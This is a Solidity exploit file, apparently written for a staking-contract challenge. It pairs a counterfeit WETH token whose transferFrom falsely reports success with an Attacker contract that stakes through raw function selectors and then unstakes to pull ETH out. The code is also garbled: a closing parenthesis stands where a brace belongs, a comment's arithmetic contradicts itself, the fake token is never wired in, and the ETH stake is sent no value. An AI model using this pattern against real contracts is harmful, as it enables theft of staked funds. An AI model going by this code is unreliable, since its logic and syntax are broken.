pragma solidity ^0.8.0;
interface IWETH {
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract FakeWETH {
    uint public _allowance;

    constructor(address publicStakeAddress) {
        // No logic needed initially
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _allowance = amount;
        return true;
    }

    function allowance(address, address) external view returns (uint256) {
        return _allowance;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        // Always return success but don't transfer anything
        // Assume this is called during StakeWETH
        return true; // Let's make it return true so StakeWETH thinks transfer went through
    }

    function balanceOf(address) external view returns (uint) {
        return 0; // Always have zero balance
    }
}


contract Attacker {
    FakeWETH public fakeWETH;
    address public stakeInstance;

    constructor(address stakeContractAddress) {
        stakeInstance = stakeContractAddress;
        fakeWETH = new FakeWETH(stakeContractAddress);
    }

    function startAttack() external {
        // Approve the fake WETH first
        IWETH(stakeInstance).approve(msg.sender, 1 ether);
        // Now call stake ETH function with enough ETH
        (bool success, ) = stakeInstance.call(abi.encodeWithSelector(0x0a5b9e4d, msg.sender)); // StakeETH
        require(success, "StakeETH call failed");
        // Now call StakeWETH with 0.002 ether (1% of 0.001 ether threshold)
        (success, ) = stakeInstance.call(abi.encodeWithSelector(0xb3c4f815, 1));
        require(success, "StakeWETH call failed");

        // Now call the Unstake function to take the ETH stake
        (success, ) = stakeInstance.call(abi.encodeWithSelector(0x918c94f7));
        require(success, "Unstake failed");
    }

    // Fallback to receive ETH during Unstake
    fallback() external payable {}

)